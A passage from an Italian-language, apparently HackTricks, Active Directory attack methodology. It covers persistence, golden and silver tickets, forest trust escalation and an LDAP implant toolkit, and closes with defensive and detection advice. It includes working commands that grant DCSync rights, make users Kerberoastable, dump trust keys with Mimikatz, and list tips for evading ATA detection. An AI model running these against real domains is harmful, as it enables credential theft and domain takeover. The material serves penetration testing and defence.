{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accederanno al sistema via RDP, quindi qui trovi come eseguire un paio di attack sulle sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer joinati al domain, assicurando che sia **randomized**, unica e frequentemente **changed**. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACL solo per gli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile fare pivot verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per elevare i privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **vulnerable templates**, è possibile abusarne per elevare i privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o, ancora meglio, **Enterprise Admin**, puoi fare il **dump** del **database del domain**: _ntds.dit_.

[**Ulteriori informazioni sull'attack DCSync sono disponibili qui**](dcsync.md).

[**Ulteriori informazioni su come rubare NTDS.dit sono disponibili qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per persistence.\
Per esempio potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **legittimo Ticket Granting Service (TGS) ticket** per un servizio specifico usando l'**NTLM hash** (per esempio, l'**hash dell'account del PC**). Questo metodo viene usato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** consiste nell'ottenere accesso all'**NTLM hash dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, che sono essenziali per autenticarsi nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono come golden tickets forgiati in modo da **bypassare i comuni meccanismi di detection dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per poter mantenere persistence nell'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare i certificati permette anche di mantenere persistence con privilegi elevati all'interno del domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory assicura la sicurezza dei **privileged groups** (come Domain Admins e Enterprise Admins) applicando una **Access Control List (ACL)** standard su questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere abusata; se un attaccante modifica l'ACL di AdminSDHolder per dare accesso completo a un utente normale, quell'utente ottiene un controllo esteso su tutti i privileged groups. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non autorizzati se non monitorata attentamente.

[**Ulteriori informazioni sul gruppo AdminDSHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account **local administrator**. Ottenendo diritti admin su una macchina del genere, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Successivamente, è necessaria una modifica del registry per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** ad un **utente** alcune **special permissions** su specifici oggetti del domain che consentiranno all'utente di **elevare i privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** vengono usati per **memorizzare** i **permessi** che un **object** ha **su** un **object**. Se riesci a **fare** una **piccola modifica** nel **security descriptor** di un object, puoi ottenere privilegi molto interessanti su quell'object senza dover essere membro di un privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principal/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si auto-eliminano senza tombstones, cancellando le evidenze LDAP mentre lasciano SID orfani, riferimenti `gPLink` rotti o risposte DNS in cache (ad esempio, contaminazione ACE di AdminSDHolder o redirect malevoli `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, garantendo accesso a tutti gli account del domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri cos'è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **chiaro** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specifici **senza** lasciare alcun **log** riguardo alle **modifiche**. Hai bisogno di privilegi **DA** e di essere nel **root domain**.\
Nota che se usi dati errati, compariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo parlato di come elevare i privilegi se hai **permesso sufficiente per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere persistence**.\
Controlla:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo domain potrebbe potenzialmente portare alla compromissione dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **domain** di accedere alle risorse in un altro **domain**. In sostanza crea un collegamento tra i sistemi di autenticazione dei due domain, permettendo ai controlli di autenticazione di fluire senza interruzioni. Quando i domain configurano un trust, si scambiano e conservano specifiche **chiavi** nei rispettivi **Domain Controllers (DCs)**, che sono cruciali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **trusted domain**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** dal DC del proprio domain. Questo TGT è cifrato con una **chiave** condivisa che entrambi i domain hanno concordato. L'utente presenta quindi questo TGT al **DC del trusted domain** per ottenere un service ticket (**TGS**). Dopo la convalida riuscita dell'inter-realm TGT da parte del DC del trusted domain, viene emesso un TGS, concedendo all'utente l'accesso al servizio.

**Steps**:

1. Un **client computer** nel **Domain 1** avvia il processo usando il proprio **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** dal proprio **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client richiede quindi un **inter-realm TGT** a DC1, necessario per accedere alle risorse nel **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte del domain trust bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server nel Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere accesso al servizio nel Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 via o a 2 vie**. Nell'opzione a 2 vie, entrambi i domain si fidano l'uno dell'altro, ma nella relazione di trust a **1 via** uno dei domain sarà il **trusted** e l'altro il **trusting** domain. Nell'ultimo caso, **potrai accedere solo alle risorse all'interno del trusting domain dal trusted one**.

Se Domain A si fida di Domain B, A è il trusting domain e B è il trusted one. Inoltre, in **Domain A**, questo sarebbe un **Outbound trust**; e in **Domain B**, sarebbe un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: È una configurazione comune all'interno dello stesso forest, in cui un child domain ha automaticamente un trust transitivo bidirezionale con il proprio parent domain. In sostanza, questo significa che le richieste di autenticazione possono fluire senza interruzioni tra parent e child.
- **Cross-link Trusts**: Chiamati anche "shortcut trusts", vengono stabiliti tra child domains per accelerare i processi di referral. In forest complessi, i referral di autenticazione normalmente devono risalire fino al forest root e poi scendere fino al domain di destinazione. Creando cross-links, il percorso viene accorciato, il che è particolarmente utile in ambienti geograficamente distribuiti.
- **External Trusts**: Sono configurati tra domain diversi e non correlati e sono non transitivi per natura. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trusts sono utili per accedere alle risorse in un domain al di fuori dell'forest corrente che non è connesso da un forest trust. La sicurezza è rafforzata dal SID filtering con gli external trusts.
- **Tree-root Trusts**: Questi trust vengono stabiliti automaticamente tra il forest root domain e un tree root appena aggiunto. Anche se non sono comuni, i tree-root trust sono importanti per aggiungere nuovi domain tree a un forest, consentendo loro di mantenere un nome di domain unico e garantendo la transitività bidirezionale. Ulteriori informazioni si trovano nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è un trust transitivo bidirezionale tra due forest root domain, e applica anche il SID filtering per rafforzare le misure di sicurezza.
- **MIT Trusts**: Questi trust vengono stabiliti con Kerberos domain non-Windows, conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). Gli MIT trusts sono un po' più specializzati e si rivolgono ad ambienti che richiedono integrazione con sistemi basati su Kerberos al di fuori dell'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship può anche essere **transitiva** (A si fida di B, B si fida di C, allora A si fida di C) oppure **non-transitiva**.
- Una trust relationship può essere configurata come **bidirectional trust** (entrambi si fidano l'uno dell'altro) oppure come **one-way trust** (solo uno si fida dell'altro).

### Attack Path

1. **Enumerare** le trusting relationships
2. Verificare se qualche **security principal** (user/group/computer) ha **accesso** alle risorse dell'**altro domain**, magari tramite entry ACE o perché è in group dell'altro domain. Cerca **relationships across domains** (il trust è stato creato proprio per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **accounts** che possono **pivot** attraverso i domain.

Gli attacker con accesso alle risorse in un altro domain potrebbero farlo tramite tre meccanismi principali:

- **Local Group Membership**: I principal possono essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, ottenendo così un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi nel foreign domain. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal possono essere specificati in una **ACL**, in particolare come entità in **ACEs** all'interno di una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire la meccanica di ACLs, DACLs e ACEs, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare foreign security principals nel domain. Questi saranno user/group di **un domain/forest esterno**.

Puoi verificarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalatione di privilegi da Child a Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 chiavi trusted**, una per _Child --> Parent_ e un’altra per _Parent_ --> _Child_.\
> Puoi quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare come Enterprise admin al child/parent domain abusando la trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Capire come può essere sfruttato il Configuration Naming Context (NC) è cruciale. Il Configuration NC funge da repository centrale per i dati di configurazione in tutti gli ambienti Active Directory (AD) di una forest. Questi dati vengono replicati su ogni Domain Controller (DC) all’interno della forest, con i DC scrivibili che mantengono una copia scrivibile del Configuration NC. Per sfruttarlo, è necessario avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites del Configuration NC include informazioni sui siti di tutti i computer joined al domain all’interno della AD forest. Operando con privilegi SYSTEM su qualsiasi DC, gli attacker possono collegare GPO ai root DC sites. Questa azione può compromettere il root domain manipolando le policy applicate a questi siti.

Per informazioni approfondite, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore di attack prevede di puntare a gMSA privilegiati all’interno del domain. La KDS Root key, essenziale per calcolare le password dei gMSA, è archiviata nel Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella forest.

Un’analisi dettagliata e una guida passo passo sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attacker può modificare lo AD Schema per concedere a qualsiasi user il controllo completo su tutte le classi. Questo potrebbe portare ad accesso e controllo non autorizzati sui nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti Public Key Infrastructure (PKI) per creare un certificate template che consenta l’autenticazione come qualsiasi user all’interno della forest. Poiché gli oggetti PKI risiedono nel Configuration NC, compromettere un child DC scrivibile abilita l’esecuzione di attacchi ESC5.

Maggiori dettagli si possono leggere in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari senza ADCS, l’attacker ha la capacità di configurare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da uno esterno, dandoti **permessi indeterminati** su di esso. Dovrai trovare **quali principals del tuo dominio hanno quale accesso sul dominio esterno** e poi provare a sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo** alcuni **privilegi** a un principal di **diversi domini**.

Tuttavia, quando un **dominio è trusted** dal trusting domain, il trusted domain **crea un utente** con un **nome prevedibile** che usa come **password la trusted password**. Questo significa che è possibile **accedere a un utente del trusting domain per entrare nel trusted one** per enumerarlo e provare a elevare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il trusted domain è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** rispetto al domain trust (cosa non molto comune).

Un altro modo per compromettere il trusted domain è aspettare in una macchina a cui un **utente del trusted domain può accedere** per fare login via **RDP**. Poi, l'attacker potrebbe iniettare codice nel processo della sessione RDP e **accedere da lì al dominio di origine della vittima**.\
Inoltre, se la **vittima ha montato il proprio hard drive**, dal processo della sessione **RDP** l'attacker potrebbe salvare **backdoors** nella **startup folder dell'hard drive**. Questa tecnica si chiama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{endref}}

### Mitigazione dell'abuso dei domain trust

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso forest trust è mitigato da SID Filtering, che è attivato di default su tutti gli inter-forest trust. Questo si basa sull'assunzione che gli intra-forest trust siano sicuri, considerando la forest, e non il domain, come security boundary secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: il SID filtering potrebbe interrompere applicazioni e accesso degli utenti, portando alla sua occasionale disattivazione.

### **Selective Authentication:**

- Per gli inter-forest trust, l'uso della Selective Authentication assicura che gli utenti delle due forest non vengano autenticati automaticamente. Invece, sono necessari permessi espliciti affinché gli utenti possano accedere a domini e server all'interno del trusting domain o forest.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) o da attacchi sull'account del trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementa primitive LDAP in stile bloodyAD come x64 Beacon Object Files che girano interamente dentro un on-host implant (e.g., Adaptix C2). Gli operatori compilano il pacchetto con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, caricano `ldap.axs` e poi chiamano `ldap <subcommand>` dal beacon. Tutto il traffico usa il current logon security context su LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, quindi non servono socks proxy né artefatti su disco.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, e `get-groupmembers` risolvono short names/OU paths in DN completi e scaricano gli oggetti corrispondenti.
- `get-object`, `get-attribute`, e `get-domaininfo` estraggono attributi arbitrari (inclusi i security descriptors) più i metadata di forest/domain da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, e `get-rbcd` espongono candidati al roasting, impostazioni di delega, e i descrittori [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) esistenti direttamente da LDAP.
- `get-acl` e `get-writable --detailed` analizzano il DACL per elencare trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), e inheritance, fornendo target immediati per l'ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivi LDAP di scrittura per escalation & persistenza

- I BOF di creazione oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) consentono all’operatore di preparare nuovi principal o account macchina ovunque esistano diritti OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` dirottano direttamente i target una volta trovati i diritti write-property.
- I comandi focalizzati su ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync` trasformano WriteDACL/WriteOwner su qualsiasi oggetto AD in reset della password, controllo dell’appartenenza ai gruppi o privilegi di replica DCSync senza lasciare artefatti PowerShell/ADSI. I corrispondenti `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting e abuso di Kerberos

- `add-spn`/`set-spn` rendono immediatamente un utente compromesso Kerberoastable; `add-asreproastable` (toggle UAC) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, flag UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### Iniezione sidHistory, spostamento OU e modellazione della superficie d’attacco

- `add-sidhistory` inietta SID privilegiati nella sid history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo un’eredità di accesso stealthy interamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attaccante di trascinare gli asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember` o `add-spn`.
- I comandi di rimozione strettamente circoscritti (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) consentono un rollback rapido dopo che l’operatore ha raccolto credenziali o persistenza, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Restrizioni per i Domain Admins**: Si raccomanda che i Domain Admins possano effettuare il login solo sui Domain Controllers, evitando il loro uso su altri host.
- **Privilegi degli account di servizio**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: Per i task che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Si può ottenere con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione del relay LDAP**: Audit degli Event ID 2889/3074/3075 e poi applicare LDAP signing e channel binding LDAPS su DC/client per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo dell’attività di Impacket

Se vuoi rilevare il comune tradecraft AD, **non fare affidamento solo su artefatti controllati dall’operatore** come binari rinominati, nomi dei servizi, file batch temporanei o percorsi di output. Definisci una baseline di come i client Windows legittimi costruiscono traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI, poi cerca **quirk di implementazione** che rimangono anche dopo che l’operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.

- **Candidati standalone ad alta confidenza** (dopo la validazione contro la tua baseline):
- DCE/RPC autenticato con `auth_context_id = 79231 + ctx_id`
- Padding di autenticazione DCE/RPC riempito con `0xff`
- LDAP Kerberos bind che inseriscono un `AP-REQ` Kerberos grezzo direttamente in SPNEGO `mechToken`
- Richieste SMB2/3 negotiate con valori `ClientGuid` che sembrano ASCII
- WMI `IWbemLevel1Login::NTLMLogin` che usa il namespace non standard `//./root/cimv2`
- Valori nonce Kerberos hardcoded
- **Meglio come feature di correlazione/scoring**:
- Liste etype Kerberos sparse o duplicate, `PA-DATA` insolito/mancante, o ordine degli etype nel TGS-REQ diverso da Windows nativo
- Messaggi NTLM Type 1 senza informazioni di versione o messaggi Type 3 con nomi host nulli
- NTLMSSP grezzo trasportato in DCE/RPC invece che in SPNEGO, trailer di verifica DCE/RPC mancanti, o mismatch degli OID SPNEGO/Kerberos
- Più di uno di questi tratti dallo stesso host/user/session/time window è molto più forte di un singolo campo debole
- **Da usare come enrichment, non come alert standalone**:
- Nomi file di default, percorsi di output, nomi di servizi casuali, nomi batch temporanei, nomi di account computer di default e stringhe HTTP/WebDAV/RDP/MSSQL specifiche del tool
- Sono facili da cambiare per gli operatori e sono meglio usati per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decrittato, [analisi PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilità lato servizio
- Valida contro client Samba/Linux, appliance e software legacy prima di promuovere a alert
- Promuovi le detection da enrichment -> hunting -> alerting man mano che costruisci fiducia nella baseline

### **Implementazione di tecniche di deception**

- Implementare deception significa predisporre trappole, come utenti o computer esca, con caratteristiche come password che non scadono o marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l’aggiunta a gruppi ad alto privilegio.
- Un esempio pratico prevede l’uso di strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maggiori informazioni sul deployment di tecniche di deception si trovano su [Deploy-Deception su GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificazione della deception**

- **Per oggetti utente**: indicatori sospetti includono ObjectSID atipici, logon infrequenti, date di creazione e conteggi bassi di bad password.
- **Indicatori generali**: confrontare gli attributi di possibili oggetti esca con quelli di oggetti reali può rivelare inconsistenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare queste deception.

### **Bypassing dei sistemi di detection**

- **Microsoft ATA Detection Bypass**:
- **Enumerazione degli utenti**: evitare la enumerazione delle sessioni sui Domain Controllers per prevenire la detection di ATA.
- **Impersonazione dei ticket**: l’uso di chiavi **aes** per la creazione dei ticket aiuta a eludere la detection evitando il downgrade a NTLM.
- **Attacchi DCSync**: si consiglia di eseguire da un host non Domain Controller per evitare la detection di ATA, poiché l’esecuzione diretta da un Domain Controller attiverà gli alert.

## Riferimenti

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
